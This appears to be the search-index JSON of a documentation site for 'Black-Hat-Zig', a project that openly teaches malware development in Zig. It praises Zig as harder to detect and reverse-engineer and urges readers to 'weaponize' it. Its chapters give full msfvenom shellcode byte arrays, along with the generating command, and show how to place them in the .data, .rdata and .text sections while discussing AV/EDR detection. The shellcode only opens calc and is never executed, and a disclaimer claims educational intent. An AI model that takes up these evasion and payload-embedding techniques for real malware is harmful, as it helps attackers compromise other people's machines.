{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Black-Hat-Zig","text":"<p> Hello hackers. Hello maldevs. Hello reversers. Nice to see you here to explore the dark power of Zig! Maintained and managed by @CX330Blake </p>"},{"location":"#intro","title":"Intro","text":"<p>This project is continuously updating!</p> <p>This project provides many malware techniques implementation using Zig since I'm a huge fan of it. You can use this repo to weaponize Zig. Black-Hat-Zig is continuously updating to make sure it contains as more content as it could. It will be perfect if you want to create a PR for this project.</p> <p>Okay, let's hack the planet!</p>"},{"location":"#why-zig","title":"Why Zig?","text":"<ul> <li>\ud83e\udd1d Easy to interact with C/C++ source</li> <li>\ud83d\udd0e It's newer, so it's harder to be detect</li> <li>\ud83d\udcaa Strongly low level control, even lower than C</li> <li>\ud83d\ude31 It's harder to RE because of the modern compiler</li> <li>\ud83d\udee1\ufe0f Minimal runtime dependencies - No massive standard library footprint</li> <li>\ud83c\udfaf No undefined behavior - Explicit handling of edge cases prevents crashes</li> </ul>"},{"location":"#contributors","title":"Contributors","text":"<p>This project is mainly maintained &amp; managed by @CX330Blake. PRs are welcomed. Hope there's more people use Zig for malware developing so the ecosystem will be more mature.</p> <p>Huge thanks for these contributors!</p> <p> </p>"},{"location":"#credits-references","title":"Credits &amp; References","text":"<ul> <li>Maldev Academy</li> <li>OffensiveNim</li> </ul>"},{"location":"#star-history","title":"Star History","text":""},{"location":"#disclaimer","title":"Disclaimer","text":"<p>This project is for ethical and educational purpose only. Don't be a cyber criminal.</p>"},{"location":"epilogue/","title":"Epilogue","text":"<p>Thanks. If you like this repo please give a star!</p>"},{"location":"prologue/","title":"Before We Start","text":""},{"location":"prologue/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Windows environment</p> </li> <li> <p>The code can be compiled on Linux/MacOS, but still need a Windows environment to execute</p> </li> <li> <p>Zig &gt;= 0.14.0</p> </li> <li> <p>ZYPE installed</p> </li> <li> <p>ZYPE is a tool we will often used here. To install, please visit ZYPE</p> </li> </ul>"},{"location":"prologue/#compiling-the-codes","title":"Compiling The Codes","text":"<p>The compilation is easy thanks to the good support for Zig's cross compilation. To build a Windows binary, we have three way to achieve it.</p> <ol> <li>Add <code>-Dtarget</code> flag to the <code>zig build</code> or <code>zig build-exe</code> command during the compilation.</li> <li>Simply run <code>zig-build</code> or <code>zig-build-exe</code> on a Windows machine.</li> <li>Set the default target architecture and OS in the <code>build.zig</code>.</li> </ol> <p>Here we'll use the third method to do this, so that no matter which OS you're using, you can simply run <code>zig build</code> to build the binary. For more details, this is the configuration I set for every projects that depend on Windows API.</p> <pre><code>const target = b.standardTargetOptions(.{ .default_target = .{\n    .cpu_arch = .x86_64,\n    .os_tag = .windows\n}});\n</code></pre>"},{"location":"prologue/#other-useful-tools","title":"Other Useful Tools","text":"<ul> <li>ZYRA: Your Runtime Armor</li> <li>An executable packer written in Zig</li> </ul>"},{"location":"Payload-Obfuscation/ip_addr/","title":"IP Address Obfuscation","text":"<p>Coming soon...</p>"},{"location":"Payload-Placement/dot_data/","title":"Put payload in .data section","text":""},{"location":"Payload-Placement/dot_data/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_data/#what-is-payload","title":"What Is Payload?","text":"<p>To execute the malicious code, we must load the malicious stuff into the binary somehow. And this malicious stuff, is the so called \"payload\" or \"shellcode\".</p> <p>We'll use the payload generated by MSFvenom for every examples in \"Payload Placement\". You can copy and paste the following command to generate the payload first. But since it's generated in C array format, I'll recommend you just copy and paste the corresponding payload in my code, which is already translated from C array to Zig array by AI.</p> <pre><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c\n</code></pre>"},{"location":"Payload-Placement/dot_data/#sections","title":"Sections","text":"<p>For those who visited this project, I'll assume you already know what is \"section\" and know the basics of the following common sections.</p> <ul> <li>.bss section</li> <li>Uninitialized global variables</li> <li>.data section</li> <li>Initialized global variables</li> <li>.rdata section</li> <li>Read-only data (strings, vtable, etc)</li> <li>.text section</li> <li>Code segment, stores machine codes</li> <li>.rsrc section</li> <li>Resource section, only exists on Windows. It often stores graph, icon, etc</li> </ul> <p>For more details: Special Sections - MSDN.</p>"},{"location":"Payload-Placement/dot_data/#code-explanation","title":"Code Explanation","text":"<p>In this chapter, I will show you how to store out payload into .data section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .data saved payload (var data goes to .data section in Zig)\nvar data_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;data_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{data_section_payload.len});\n    print(\"[i] Payload stored in .data section (read-write)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Actually, it's easy to put the payload in .data section, just declare a global var and that's it! Although it's simple, it's also easy for malware analyst and reverse engineer to notice that. And it hash high possibility to be detected for most of the AV/EDR.</p>"},{"location":"Payload-Placement/dot_rdata/","title":"Put payload in .rdata section","text":""},{"location":"Payload-Placement/dot_rdata/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_rdata/#code-explanation","title":"Code Explanation","text":"<p>In this chapter, I will show you how to store out payload into .rdata section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .rdata saved payload\n//\n// use `const` to put it in .rdata (read-only data)\nconst rdata_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n// Helper function to wait for Enter key\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;rdata_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{rdata_section_payload.len});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Add the payload to .rdata section is easy too. The only difference between the previous one is we changed the <code>var</code> to <code>const</code>. That way, the payload will become read-only and be placed in.rdata section.</p>"},{"location":"Payload-Placement/dot_rsrc/","title":"Put payload in .rsrc section","text":"<p>Currently unavailable. See https://github.com/CX330Blake/Black-Hat-Zig/issues/5</p>"},{"location":"Payload-Placement/dot_text/","title":"Put payload in .text section","text":""},{"location":"Payload-Placement/dot_text/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_text/#code-explanation","title":"Code Explanation","text":"<p>In this chapter, I will show you how to store out payload into .text section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .text saved payload - most elegant approach with automatic inference\nconst text_section_payload linksection(\".text\") = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;text_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{text_section_payload.len});\n    print(\"[i] Payload stored in .text section (executable)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Here we used <code>linksection</code> keyword in Zig to easily bind the corresponding data to the target section (\".text\" in this case).</p>"}]}